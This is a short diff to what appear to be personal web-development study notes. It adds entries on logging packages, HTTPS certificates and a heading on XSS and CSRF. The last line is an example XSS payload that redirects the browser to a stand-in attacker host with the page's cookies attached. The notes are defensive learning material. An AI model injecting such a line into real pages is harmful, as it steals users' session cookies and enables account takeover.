@@ -870,4 +870,13 @@ hyosung11@HyoSungs-iMac projects %`
 
 #### Logging Tools
 - winston https://www.npmjs.com/package/winston - souped up console.log
-- morgan https://www.npmjs.com/package/morgan - monitor server activity 
+- morgan https://www.npmjs.com/package/morgan - monitor server activity
+
+### HTTPS Everywhere
+- SSL/TLS Certificates
+- Let's Encrypt: free, automated, and open Certificate Authority https://letsencrypt.org/
+- Cloudflare: makes your SaaS products faster & safer: https://www.cloudflare.com/
+
+### XSS (Cross-site Scripting) & CSRF (Cross-site Request Forgery)
+- XSS running code across sites to different sites from my browser (as a bad actor)
+- e.g., `window.location = 'haxxed.com?cookie=' + document.cookie`
